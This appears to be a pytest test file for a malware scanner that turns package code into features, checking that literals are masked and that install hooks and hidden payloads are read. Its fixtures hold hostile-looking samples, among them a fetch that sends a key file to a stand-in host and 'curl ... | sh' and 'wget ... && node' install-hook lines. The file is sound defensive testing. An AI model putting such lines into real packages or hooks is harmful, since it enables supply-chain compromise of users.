"""The code-reading features of the files a consumer runs (`CodeFeatures`), and when they are made."""

from __future__ import annotations

import random
import re
import time
from types import SimpleNamespace

import pytest

from cordon_scanner.detect.base import FileUnit
from cordon_scanner.detect.code.features import CodeFeatures
from cordon_scanner.detect.code.reached_flows import ReachedFlows
from cordon_scanner.foundation.content import FileContent

# Distinctive literals: none of them may appear in any feature key, hashed or not.
MARKERS = ("zqxmarkerhost", "zqxmarkerkey", "zqxmarkermod", "zqxmarkercall")
JS = (
    "const cp = require('child_process');\n"
    "const fs = require('fs');\n"
    "const x = require('zqxmarkermod');\n"
    "// a comment with https://zqxmarkerhost.example/path\n"
    "const url = 'https://zqxmarkerhost.example/c';\n"
    "const key = 'zqxmarkerkey';\n"
    "const s = 'zqxmarkercall.exec(';\n"
    "fetch(url, { body: fs.readFileSync(key) });\n"
    "cp.exec(`echo ${key}`);\n"
    "const re = /'/g;\n"
)
PY = (
    "import os  # zqxmarkerhost\n"
    "import subprocess\n"
    "v = os.environ.get('zqxmarkerkey')\n"
    "subprocess.run(['curl', 'https://zqxmarkerhost.example'])\n"
)


class Fixture:
    @staticmethod
    def features(text: str, path: str = "index.js", place: str = "import") -> dict[str, float]:
        return CodeFeatures.of({place: [(path, text.encode())]})


class TestMasking:
    @pytest.mark.parametrize(("text", "path"), [(JS, "index.js"), (PY, "setup.py")])
    def test_no_string_value_appears_in_any_key(self, text: str, path: str) -> None:
        keys = " ".join(Fixture.features(text, path))
        assert not any(marker in keys for marker in MARKERS)

    def test_a_literal_is_its_shape(self) -> None:
        assert CodeFeatures.shape("https://a.example/x") == "URL"
        assert CodeFeatures.shape("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 2) == "BASE64"
        assert CodeFeatures.shape("deadbeef" * 5) == "HEX"
        assert CodeFeatures.shape("hello") == "STRING"

    def test_a_string_spelling_a_call_is_not_a_call(self) -> None:
        keys = Fixture.features("const s = 'steal.exec(';\n")
        assert not any("_api_exec" in k for k in keys)


class TestCalls:
    def test_listed_modules_and_calls_are_named(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_child_process") == 1.0
        assert keys.get("code_import_api_mod_fs") == 1.0
        assert keys.get("code_import_api_exec") == 1.0
        assert keys.get("code_import_api_readFileSync") == 1.0

    def test_an_unlisted_module_is_other_by_shape_never_by_name(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_other") == 1.0

    def test_an_unlisted_member_call_is_hashed(self) -> None:
        keys = Fixture.features("thing.frobnicate();\n")
        assert any(k.startswith("code_import_apih_") for k in keys)
        assert not any("frobnicate" in k for k in keys)

    def test_the_n8n_credential_read_is_named(self) -> None:
        keys = Fixture.features("const c = await this.getCredentials('x');\n")
        assert "code_import_api_this.getCredentials" in keys


class TestShellAndTypeScript:
    HOOK = "package.json#postinstall.sh"

    def test_a_hook_command_is_words_with_every_address_masked(self) -> None:
        keys = Fixture.features(
            "curl -s https://zqxmarkerhost.example/zqxmarkerkey | sh", self.HOOK, "install"
        )
        assert any(k.startswith("code_install_tok_") for k in keys)
        assert not any(marker in " ".join(keys) for marker in MARKERS)

    def test_two_hosts_read_the_same(self) -> None:
        one = Fixture.features("wget http://a.example/x && node x.js", self.HOOK, "install")
        two = Fixture.features("wget http://b.example/y && node x.js", self.HOOK, "install")
        assert one == two

    def test_typescript_is_read_as_javascript(self) -> None:
        assert "code_import_api_exec" in Fixture.features("cp.exec(cmd as string);\n", "a.ts")


class TestBounds:
    def test_the_same_input_gives_the_same_features(self) -> None:
        assert Fixture.features(JS) == Fixture.features(JS)

    @pytest.mark.parametrize(
        ("text", "path"),
        [(JS * 8, "index.js"), (PY * 8, "setup.py"), ("curl -s x | sh\nnode a.js\n" * 8, "a.sh")],
    )
    def test_a_file_read_in_windows_gives_what_it_gives_whole(
        self, monkeypatch: pytest.MonkeyPatch, text: str, path: str
    ) -> None:
        whole = Fixture.features(text, path)
        monkeypatch.setattr(CodeFeatures, "WINDOW", 64)
        monkeypatch.setattr(CodeFeatures, "MARGIN", 24)
        assert Fixture.features(text, path) == whole

    def test_a_payload_past_megabytes_of_padding_is_read(self) -> None:
        padded = "/*" + " " * (3 << 20) + "*/\n" + "cp.exec(x);\n"
        assert "code_import_api_exec" in Fixture.features(padded)

    def test_a_payload_past_a_literal_longer_than_any_window_is_read(self) -> None:
        padded = "const blob = '" + "A" * (6 << 20) + "';\ncp.exec(blob);\n"
        assert "code_import_api_exec" in Fixture.features(padded)

    def test_counts_are_capped(self) -> None:
        keys = Fixture.features("a.exec();\n" * 50)
        assert keys["code_import_api_exec"] == CodeFeatures.COUNT_CAP

    def test_unfinished_python_keeps_what_was_read(self) -> None:
        keys = Fixture.features("import subprocess\ndef (:\n  '''\n", "x.py")
        assert any(k.startswith("code_import_tok_") for k in keys)

    def test_only_known_places_are_read(self) -> None:
        assert CodeFeatures.of({"other": [("index.js", JS.encode())]}) == {}


class TestWhenMade:
    @staticmethod
    def run() -> dict[str, float]:
        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
        ctx = SimpleNamespace(
            install_hook_paths=frozenset(),
            install_entry_paths=frozenset(),
            import_entry_paths=frozenset({"index.js"}),
            library_closure_paths=frozenset(),
        )
        return ReachedFlows.of([unit], ctx, {})  # type: ignore[arg-type]

    def test_a_users_scan_does_not_make_them(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ReachedFlows.MEASURE, raising=False)
        assert not any(k.startswith("code_") for k in TestWhenMade.run())

    def test_a_measurement_run_does(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ReachedFlows.MEASURE, "1")
        assert "code_import_api_exec" in TestWhenMade.run()


class TestSources:
    @staticmethod
    def ctx(install: frozenset[str] = frozenset(), entry: frozenset[str] = frozenset()) -> object:
        return SimpleNamespace(
            install_hook_paths=install,
            install_entry_paths=frozenset(),
            import_entry_paths=entry,
            library_closure_paths=frozenset(),
        )

    def test_an_install_hooks_command_line_is_install_code(self) -> None:
        manifest = b'{"name": "a", "version": "1.0.0", "scripts": {"postinstall": "node x.js"}}'
        unit = FileUnit(content=FileContent.from_bytes("package.json", manifest))
        got = ReachedFlows.sources([unit], TestSources.ctx(install=frozenset({"package.json"})))  # type: ignore[arg-type]
        assert got["install"] == [("package.json#postinstall.sh", b"node x.js")]

    @pytest.mark.parametrize(
        ("head", "read_as"),
        [
            (b"#!/usr/bin/env node\n", "bin/tool#.js"),
            (b"#!/usr/bin/python3\n", "bin/tool#.py"),
            (b"#!/bin/sh\n", "bin/tool#.sh"),
            (b"plain text\n", None),
        ],
    )
    def test_an_extensionless_bin_is_read_in_its_interpreters_language(
        self, head: bytes, read_as: str | None
    ) -> None:
        unit = FileUnit(content=FileContent.from_bytes("bin/tool", head + b"run()\n"))
        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"bin/tool"})))  # type: ignore[arg-type]
        assert [path for path, _ in got["import"]] == ([read_as] if read_as else [])

    def test_a_file_past_the_size_limit_is_read_whole(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ReachedFlows, "MAX_SIZE", 8)
        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
        got = ReachedFlows.sources([unit], TestSources.ctx(entry=frozenset({"index.js"})))  # type: ignore[arg-type]
        assert got["import"] == [("index.js", JS.encode())]


class TestShapeIsLinear:
    #: The domain test as it was written before (review 98, performance 2): its answer is the
    #: reference the linear form must give on every string.
    RUN_FIRST = re.compile(
        r"https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b|[a-z0-9.-]+\.(?:com|net|org|io|ru|xyz|top|cn|info)\b",
        re.I,
    )

    def test_it_answers_as_the_run_first_form(self) -> None:
        """The same search truthiness as the run-first form, on every string, by construction:
        `|` binds loosest, so the first two alternatives are the same in both and the third has
        nothing before its class (the `\\b` belongs to the second). The run-first third
        alternative matches at i exactly when s[i:j] is one or more of [a-z0-9.-], s[j] is the dot
        and a TLD follows at a word boundary; then s[j-1] is in the class, so the lookbehind form
        matches at j. Conversely a lookbehind match at j is a run-first match at j - 1 with a run of
        one. re.I folds the same letters onto [a-z] in both (K Kelvin, long s, dotted I). Held on
        10,000,000 generated URL-shaped strings (0 differences) and 59,171 real units of corpus q
        (0 differences); the cases below are the edges."""
        rng = random.Random(20261030)  # noqa: S311 -- a fixture, not key material
        pieces = [
            "a",
            "Z",
            "9",
            ".",
            "-",
            "com",
            ".com",
            ".Net",
            "io",
            "/",
            " ",
            "_",
            "http://",
            "1.",
        ]
        cases = [
            "",
            ".com",
            "a.com",
            "-.com",
            "..com",
            "x.comx",
            "x.com_",
            "A.INFO",
            "café.com",
            "1.2.3.4",
            "a.b.com",
            "a..com",
            "...com",
            "X.COM",
            "-x.io",
            "x.cn_",
            "x.cn-",
            "_.com",
            "é.com",
            "\u212a.com",
            "\u017f.org",
            "\u0130.net",
            "\u0131.net",
            "x.com.",
            "http://",
            "1.2.3.4.5",
            "a.comcom",
        ]
        cases += [
            "".join(rng.choice(pieces) for _ in range(rng.randint(0, 30))) for _ in range(5_000)
        ]
        for text in cases:
            assert bool(CodeFeatures._URL.search(text)) == bool(
                TestShapeIsLinear.RUN_FIRST.search(text)
            ), text

    def test_a_long_run_of_letters_is_read_once(self) -> None:
        # The run-first form backtracked through the whole run from every start: about 10^12 steps
        # here. Read once, it is milliseconds.
        started = time.process_time()
        # Letters, dots and dashes the domain test reads, neither hex nor a base64 run.
        assert CodeFeatures.shape("g.h-" * 500_000) == "LONG_STRING"
        assert time.process_time() - started < 5


class TestThePackagePlace:
    """`code_package_*`: every Python file of the unit, reached or not. A source distribution's import
    entry and library closure are often one file or none, so the three places read almost none of its
    code (30 PyPI packages: 0 or 1 files reached each). Measure-only, like the other places."""

    FILES = (
        ("pkg/__init__.py", PY),
        ("pkg/unreached.py", "import socket\nsocket.create_connection(('h', 1))\nos.system('x')\n"),
        ("pkg/readme.txt", "not python"),
        ("pkg/index.js", JS),
    )

    @staticmethod
    def ctx() -> object:
        return SimpleNamespace(
            install_hook_paths=frozenset(),
            install_entry_paths=frozenset(),
            import_entry_paths=frozenset({"pkg/__init__.py"}),
            library_closure_paths=frozenset(),
        )

    @classmethod
    def units(cls) -> list[FileUnit]:
        return [FileUnit(content=FileContent.from_bytes(p, t.encode())) for p, t in cls.FILES]

    def test_every_python_file_is_a_source_and_nothing_else(self) -> None:
        got = ReachedFlows.sources(self.units(), self.ctx())  # type: ignore[arg-type]
        assert [path for path, _ in got["package"]] == ["pkg/__init__.py", "pkg/unreached.py"]
        assert [path for path, _ in got["import"]] == ["pkg/__init__.py"]

    def test_an_unreached_file_is_read_under_the_package_place_only(self) -> None:
        keys = CodeFeatures.of({"package": [("pkg/unreached.py", self.FILES[1][1].encode())]})
        assert any(k.startswith("code_package_tok_") for k in keys)
        assert not any(k.startswith(("code_import_", "code_closure_")) for k in keys)

    def test_a_users_scan_does_not_make_them(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ReachedFlows.MEASURE, raising=False)
        got = ReachedFlows.of(self.units(), self.ctx(), {})  # type: ignore[arg-type]
        assert not any(k.startswith("code_") for k in got)

    def test_a_measurement_run_makes_them(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ReachedFlows.MEASURE, "1")
        got = ReachedFlows.of(self.units(), self.ctx(), {})  # type: ignore[arg-type]
        assert any(k.startswith("code_package_tok_") for k in got)
        assert "code_package_api_mod_socket" not in got  # `socket` is not on the named list
        assert any(k.startswith("code_package_apih_") for k in got)

    def test_the_same_files_give_the_same_features(self) -> None:
        files = [(p, t.encode()) for p, t in self.FILES if p.endswith(".py")]
        assert CodeFeatures.of({"package": files}) == CodeFeatures.of({"package": list(files)})

    @pytest.mark.parametrize("size", [1, 7, 64, 1000])
    def test_a_file_read_in_windows_gives_the_features_it_gives_whole(self, size: int) -> None:
        data = (PY * 12).encode()

        def windows():
            for start in range(0, len(data), size):
                yield data[start : start + size]

        whole = CodeFeatures.of({"package": [("x.py", data)]})
        assert CodeFeatures.of({"package": [("x.py", windows)]}) == whole

    def test_files_may_be_given_lazily_one_at_a_time(self) -> None:
        files = [(p, t.encode()) for p, t in self.FILES if p.endswith(".py")]
        assert CodeFeatures.of({"package": iter(files)}) == CodeFeatures.of({"package": files})

    def test_no_string_value_appears_in_any_key(self) -> None:
        keys = " ".join(CodeFeatures.of({"package": [("pkg/a.py", PY.encode())]}))
        assert not any(marker in keys for marker in MARKERS)
        assert "code_package_" in keys

    def test_a_literal_changes_nothing_but_its_shape(self) -> None:
        one = CodeFeatures.of({"package": [("a.py", b"x = 'aaaa'\nrun(x)\n")]})
        two = CodeFeatures.of({"package": [("a.py", b"x = 'zzzzzz'\nrun(x)\n")]})
        assert one == two


class TestThePackagePlaceAddsOnly:
    """The identity test of `FeatureSchema.SAME_AS` for the package place (and for a miss in the feature
    step being a gap): a user's scan computes no code feature, before or after; a measurement run gives
    every feature it gave, with the same values, and the `code_package_*` ones besides."""

    @staticmethod
    def measured(monkeypatch: pytest.MonkeyPatch, places: tuple[str, ...]) -> dict[str, float]:
        monkeypatch.setenv(ReachedFlows.MEASURE, "1")
        monkeypatch.setattr(CodeFeatures, "PLACES", places)
        return ReachedFlows.of(  # type: ignore[arg-type]
            TestThePackagePlace.units(), TestThePackagePlace.ctx(), {}
        )

    def test_a_measurement_run_gives_what_it_gave_and_the_package_features_besides(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        earlier = self.measured(monkeypatch, ("install", "import", "closure"))
        now = self.measured(monkeypatch, ("install", "import", "closure", "package"))
        assert earlier
        assert {k: v for k, v in now.items() if not k.startswith("code_package_")} == earlier
        assert any(k.startswith("code_package_") for k in now)

    def test_a_users_scan_computes_no_code_feature(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ReachedFlows.MEASURE, raising=False)
        got = ReachedFlows.of(  # type: ignore[arg-type]
            TestThePackagePlace.units(), TestThePackagePlace.ctx(), {}
        )
        assert not any(k.startswith("code_") for k in got)
